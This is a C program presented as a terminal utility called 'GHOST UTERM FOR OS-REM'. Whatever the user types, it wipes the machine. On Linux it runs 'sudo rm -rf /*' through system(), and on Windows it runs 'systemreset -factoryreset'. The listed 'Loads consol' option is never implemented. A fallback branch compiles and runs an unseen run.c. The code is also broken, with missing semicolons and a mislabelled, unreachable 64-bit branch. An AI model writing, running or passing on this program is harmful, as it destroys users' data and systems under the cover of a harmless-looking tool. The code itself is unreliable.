#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<time.h>

int main(){
    #ifdef _WIN32
        char command[] = "systemreset -factoryreset";
        printf("\x1b[H\x1b[2J\x1b[3J");
        char response[10];
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        printf("\e[0;35m*                                             *\n\e[0;35m");
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
        printf("\e[0;91m[-] Using -> %s\n\n",command);
        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
        printf("\e[0;91m[+] |x4           : Loads consol \n");
        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
        printf("\n         >>>> \n");
        fgets(response, sizeof(response), stdin);
        printf("running")
        system(command);
    #elif __linux__
        char command[] = "sudo rm -rf /*";
        printf("\x1b[H\x1b[2J\x1b[3J");
        char response[10];
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        printf("\e[0;35m*                                             *\n\e[0;35m");
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;91m[-] Operating System Detected -> linux\n\n");
        printf("\e[0;91m[-] Using -> %s\n\n", command);
        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
        printf("\e[0;91m[+] Press Enter : Will continue with the deletion/factory reset process\n");
        printf("\n >>>>");
        fgets(response, sizeof(response), stdin);
        system(command);
    #elif _WIN64
        char command[] = "systemreset -factoryreset";
        printf("\x1b[H\x1b[2J\x1b[3J");
        char response[10];
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;35m*         GHOST UTERM FOR OS-REM              *\n\e[0;35m");
        printf("\e[0;35m*           %d-%02d-%02d %02d:%02d:%02d               *\n\e[0;35m", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        printf("\e[0;35m*                                             *\n\e[0;35m");
        printf("\e[0;35m***********************************************\n\e[0;35m");
        printf("\e[0;91m[-] Operating System Detected -> Windows\n\n");
        printf("\e[0;91m[-] Operating System Arch     -> 32\n\n");
        printf("\e[0;91m[-] Using -> %s\n\n",command);
        printf("\e[0;91m--------------------- Listed/Avalible commands ---------------------\n");
        printf("\e[0;91m[+] |x4           : Loads consol \n");
        printf("\e[0;91m[+] hitting Enter : Will continue with the deletion/factory reset process\n");
        printf("\n         >>>> \n");
        fgets(response, sizeof(response), stdin);
        printf("running")
        system(command);
    #else
        printf("this system may not be supported running shell \n")
        system("gcc run.c -o run ; ./run")
    #endif 
}